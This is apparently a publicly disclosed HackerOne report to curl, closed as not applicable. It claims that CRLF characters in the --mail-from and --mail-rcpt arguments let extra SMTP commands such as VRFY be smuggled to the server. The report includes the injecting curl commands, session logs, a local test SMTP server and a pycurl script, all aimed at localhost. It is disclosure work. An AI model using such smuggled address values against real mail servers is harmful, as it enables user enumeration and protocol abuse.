{
  "id": 3235428,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMjM1NDI4",
  "url": "https://hackerone.com/reports/3235428",
  "title": "CRLF injection in libcurl's SMTP client via --mail-from and --mail-rcpt allows SMTP command smuggling",
  "state": "Closed",
  "substate": "not-applicable",
  "severity_rating": "medium",
  "readable_substate": "N/A",
  "created_at": "2025-07-03T05:49:06.263Z",
  "submitted_at": "2025-07-03T05:49:06.523Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "skrcprst",
    "url": "/skrcprst",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/phgxcvx36eqcqtm6881t98juv0uf/36bca6668139d77be42208d896968344ae7a76c55ee0f8b0f28281ccd492ff02"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 35663,
    "url": "https://hackerone.com/curl",
    "handle": "curl",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/36bca6668139d77be42208d896968344ae7a76c55ee0f8b0f28281ccd492ff02",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/19c85a12ac35f466af1ea2b0ae853bfe5e8f057fb1d6fb62db131707bb67b30d"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "curl",
      "twitter_handle": "",
      "website": "https://curl.se",
      "about": "cURL is an Open Source project providing a library and command-line tool doing internet transfers"
    }
  },
  "has_bounty?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2025-07-03T22:57:44.274Z",
  "bug_reporter_agreed_on_going_public_at": "2025-07-03T22:57:44.084Z",
  "team_member_agreed_on_going_public_at": "2025-07-03T11:24:04.761Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "## Summary:\n\nlibcurl's SMTP client is vulnerable to CRLF injection via the `--mail-from` and `--mail-rcpt` parameters.\nAn attacker can inject newline characters to smuggle SMTP commands like `VRFY`, potentially enabling user enumeration or protocol abuse.\nWhile curl may fail after injection, the injected commands are executed by the SMTP server, confirming the vulnerability.\n\n### AI statement\n\nYes, I have used AI to find the vulnerability.\n\n## Affected version\n\nI have tested on Ubuntu 24.04.2 with:\n\n- curl 8.5.0 (system)\n- curl 8.15.0-DEV (my local build)\n- PycURL/7.45.6 with libcurl/8.12.1-DEV \n\nThe full system curl version:\n\n```shell\n$ curl -V\ncurl 8.5.0 (x86_64-pc-linux-gnu) libcurl/8.5.0 OpenSSL/3.0.13 zlib/1.3 brotli/1.1.0 zstd/1.5.5 libidn2/2.3.7 libpsl/0.21.2 (+libidn2/2.3.7) libssh/0.10.6/openssl/zlib nghttp2/1.59.0 librtmp/2.3 OpenLDAP/2.6.7\nRelease-Date: 2023-12-06, security patched: 8.5.0-2ubuntu10.6\nProtocols: dict file ftp ftps gopher gophers http https imap imaps ldap ldaps mqtt pop3 pop3s rtmp rtsp scp sftp smb smbs smtp smtps telnet tftp\nFeatures: alt-svc AsynchDNS brotli GSS-API HSTS HTTP2 HTTPS-proxy IDN IPv6 Kerberos Largefile libz NTLM PSL SPNEGO SSL threadsafe TLS-SRP UnixSockets zstd\n```\n\nThe full local build version:\n\n```shell\n$ curl -V\ncurl 8.15.0-DEV (Linux) libcurl/8.15.0-DEV OpenSSL/3.0.13 zlib/1.3 brotli/1.1.0 zstd/1.5.5 libidn2/2.3.7 libpsl/0.21.2 libssh2/1.11.0 nghttp2/1.59.0 OpenLDAP/2.6.7\nRelease-Date: [unreleased]\nProtocols: dict file ftp ftps gopher gophers http https imap imaps ipfs ipns ldap ldaps mqtt pop3 pop3s rtsp scp sftp smb smbs smtp smtps telnet tftp ws wss\nFeatures: alt-svc AsynchDNS brotli HSTS HTTP2 HTTPS-proxy IDN IPv6 Largefile libz NTLM PSL SSL threadsafe TLS-SRP UnixSockets zstd\n```\n\n## Steps To Reproduce:\n\n1. run a test SMTP server; the one I used is listed below named `smtp_server`, ran as `./smtp_server` and listened at `localhost:1025`\n\n1. send an email with normal email addresses, something like: `curl -vf --url \"smtp://localhost:1025/\" --mail-from \"attacker@example.com\" --mail-rcpt \"recipient@example.com\" --upload-file mail.txt` where `mail.txt` is a text file -- curl finishes normally\n\n1. now send an email with injected CRLF's, for example in the \"from\" field, something like: `curl -vf --url \"smtp://localhost:1025/\" --mail-from \"$(printf 'user@example.com\\r\\nVRFY d@example.com\\r\\n')\" --mail-rcpt \"recipient@example.com\" --upload-file mail.txt` -- curl fails with `DATA failed: 250` as the server sent `250 OK ...` to the injected `VRFY` command instead of expected `354`; this is demonstrating a CRLF injection took place\n\nI believe the problem arises since `\"MAIL FROM:%s%s%s%s%s%s\"` in `smtp_perform_mail` in `smtp.c` concatenates mail fields without sanitization (and `smtp_parse_address` does not sanitize \"\\r\\n\" either).\n\n## Supporting Material/References:\n\nNormal mail send:\n\n```shell\n$ curl -vf --url \"smtp://localhost:1025/\" --mail-from \"attacker@example.com\" --mail-rcpt \"recipient@example.com\" --upload-file mail.txt\n* Host localhost:1025 was resolved.\n* IPv6: ::1\n* IPv4: 127.0.0.1\n*   Trying 127.0.0.1:1025...\n* Connected to localhost (127.0.0.1) port 1025\n< 220 test-smtpd Python SMTP 1.4.6\n> EHLO mail.txt\n< 250-test-smtpd\n< 250-SIZE 33554432\n< 250-8BITMIME\n< 250-SMTPUTF8\n< 250 HELP\n> MAIL FROM:<attacker@example.com> SIZE=4\n< 250 OK\n> RCPT TO:<recipient@example.com>\n< 250 OK\n> DATA\n< 354 End data with <CR><LF>.<CR><LF>\n} [4 bytes data]\n* We are completely uploaded and fine\n< 250 Message accepted for delivery\n* Connection #0 to host localhost left intact\n```\n\nSending with CRLF in \"from\" field:\n\n```shell\n$ cat mail.txt\nHuh?\n\n$ curl -vf --url \"smtp://localhost:1025/\" --mail-from \"$(printf 'user@example.com\\r\\nVRFY d@example.com\\r\\n')\" --mail-rcpt \"recipient@example.com\" --upload-file mail.txt\n* Host localhost:1025 was resolved.\n* IPv6: ::1\n* IPv4: 127.0.0.1\n*   Trying 127.0.0.1:1025...\n* Connected to localhost (127.0.0.1) port 1025\n< 220 test-smtpd Python SMTP 1.4.6\n> EHLO mail.txt\n< 250-test-smtpd\n< 250-SIZE 33554432\n< 250-8BITMIME\n< 250-SMTPUTF8\n< 250 HELP\n> MAIL FROM:<user@example.com\n> VRFY d@example.com\n> SIZE=4\n< 250 OK\n> RCPT TO:<recipient@example.com>\n< 250 OK: John X Doe <d@example.com>\n> DATA\n< 250 OK\n* DATA failed: 250\n> QUIT\n< 354 End data with <CR><LF>.<CR><LF>\n* Closing connection\ncurl: (55) DATA failed: 250\n```\n\nSending with CRLF in \"rcpt\" field:\n\n```shell\n$ curl -vf --url \"smtp://localhost:1025/\" --mail-rcpt \"$(printf 'rcpt@example.com\\r\\nVRFY d@example.com\\r\\n')\" --mail-from \"from@example.com\" --upload-file mail.txt\n* Host localhost:1025 was resolved.\n* IPv6: ::1\n*   Trying 127.0.0.1:1025...\n* Connected to localhost (127.0.0.1) port 1025\n< 220 test-smtpd Python SMTP 1.4.6\n> EHLO mail.txt\n< 250-test-smtpd\n< 250-SIZE 33554432\n< 250-8BITMIME\n< 250-SMTPUTF8\n< 250 HELP\n> MAIL FROM:<from@example.com> SIZE=4\n< 250 OK\n> RCPT TO:<rcpt@example.com\n> VRFY d@example.com\n>\n< 250 OK\n> DATA\n< 250 OK: John X Doe <d@example.com>\n* DATA failed: 250\n> QUIT\n< 354 End data with <CR><LF>.<CR><LF>\n* Closing connection\ncurl: (55) DATA failed: 250\nerror: Recipe `test-bad-rcpt` failed on line 13 with exit code 55\n```\n\nSending with CRLF using `pycURL`:\n\n```shell\n$ ./send-with-pycurl\n2025-07-03 15:08:38.173 | INFO     | __main__:<module>:37 - pycurl version: PycURL/7.45.6 libcurl/8.12.1-DEV OpenSSL/3.4.1 zlib/1.3 brotli/1.1.0 libssh2/1.11.1_DEV nghttp2/1.64.0\n2025-07-03 15:08:38.173 | INFO     | __main__:send:22 - sending email from 'user@example.com\\r\\nVRFY d@example.com' to 'recipient@example.com'\n2025-07-03 15:08:38.176 | ERROR    | __main__:send:32 - exception: (55, 'DATA failed: 250')\n```\n\nServer logs (for the illustration):\n\n```shell\n$ ./smtp_server\nSMTP server running at localhost:1025 (Ctrl+C to stop)\n2025-07-03 15:08:23.449 | INFO     | __main__:handle_DATA:24 - Message received -- from: attacker@example.com, to: ['recipient@example.com']\n2025-07-03 15:08:23.449 | INFO     | __main__:handle_DATA:25 - Data:>>>Huh?\n<<<\n2025-07-03 15:08:31.116 | INFO     | __main__:handle_VRFY:29 - Message received -- from: user@example.com, to: []\n2025-07-03 15:08:31.116 | INFO     | __main__:handle_VRFY:37 - Sending back '250 OK: John X Doe <d@example.com>'\n2025-07-03 15:08:38.176 | INFO     | __main__:handle_VRFY:29 - Message received -- from: user@example.com, to: []\n2025-07-03 15:08:38.176 | INFO     | __main__:handle_VRFY:37 - Sending back '250 OK: John X Doe <d@example.com>'\n```\n\n`smtp_server` script:\n\n```python\n#!/usr/bin/env -S uv run -q --script\n# /// script\n# dependencies = [\n#   \"loguru\",\n#   \"aiosmtpd\",\n# ]\n# ///\n\nfrom aiosmtpd.controller import Controller\nfrom aiosmtpd.smtp import SMTP\nfrom loguru import logger\n\n\nclass MessageHandler:\n    async def handle_DATA(self, server, session, envelope):\n        logger.info(\"Message received -- from: {}, to: {}\", envelope.mail_from, envelope.rcpt_tos)\n        logger.info(\"Data:>>>{}<<<\", envelope.content.decode(\"utf8\", errors=\"replace\"))\n        return \"250 Message accepted for delivery\"\n\n    async def handle_VRFY(self, server, session, envelope, address, *args, **kwargs):\n        logger.info(\"Message received -- from: {}, to: {}\", envelope.mail_from, envelope.rcpt_tos)\n        USERS = {\n            \"d@example.com\": \"John X Doe\",\n        }\n        if full_name := USERS.get(address.lower()):\n            response = f\"250 OK: {full_name} <{address}>\"\n        else:\n            response = f\"550 No such user {address}\"\n        logger.info(\"Sending back {!r}\", response)\n        return response\n\n\nclass MyController(Controller):\n    def factory(self):\n        \"\"\"Subclasses can override this to customize the handler/server creation.\"\"\"\n        kwargs = {**self.SMTP_kwargs, \"hostname\": \"test-smtpd\"}\n        return SMTP(self.handler, **kwargs)\n\n\nif __name__ == \"__main__\":\n    handler = MessageHandler()\n    controller = MyController(handler, hostname=\"127.0.0.1\", port=1025)\n    controller.start()\n    print(\"SMTP server running at localhost:1025 (Ctrl+C to stop)\")\n    import time\n\n    try:\n        while True:\n            time.sleep(1)\n    except KeyboardInterrupt:\n        controller.stop()\n```\n\n`send-with-pycurl` script:\n\n```python\n#!/usr/bin/env -S uv run -q --script\n# /// script\n# dependencies = [\n#   \"loguru\",\n#   \"pycurl\",\n# ]\n# ///\nimport io\n\nimport pycurl\nfrom loguru import logger\n\n\ndef send(sender, recipient):\n    msg = f\"\"\"\\\nFrom: {sender}\nTo: {recipient}\nSubject: Hello from pycurl\n\nThis is the email body.\n    \"\"\"\n    logger.info(\"sending email from {!r} to {!r}\", sender, recipient)\n    c = pycurl.Curl()\n    c.setopt(pycurl.URL, \"smtp://localhost:1025\")\n    c.setopt(pycurl.MAIL_FROM, sender)\n    c.setopt(pycurl.MAIL_RCPT, [recipient])\n    c.setopt(pycurl.UPLOAD, 1)\n    c.setopt(pycurl.READDATA, io.BytesIO(msg.encode()))\n    try:\n        c.perform()\n    except Exception as exc:\n        logger.error(\"exception: {}\", exc)\n    c.close()\n\n\nif __name__ == \"__main__\":\n    logger.info(\"pycurl version: {}\", pycurl.version)\n    send(\"user@example.com\\r\\nVRFY d@example.com\", \"recipient@example.com\")\n```\n\n## Impact\n\n## Summary:\nThis vulnerability allows attackers to inject arbitrary SMTP commands, like VRFY, by crafting malicious email addresses. It can lead to user enumeration, bypass of client-side restrictions, or disruption of the SMTP session, especially in automated or proxy-based email workflows.",
  "weakness": {
    "id": 69,
    "name": "CRLF Injection"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": null,
  "vote_count": 5,
  "voters": [
    "jonasdiasrebelo",
    "2026",
    "0xoroot",
    "shamkhon",
    "distopia_siber"
  ],
  "severity": {
    "rating": "medium",
    "author_type": "User"
  },
  "structured_scope": {
    "databaseId": 18844,
    "asset_type": "SOURCE_CODE",
    "asset_identifier": "https://github.com/curl/curl",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
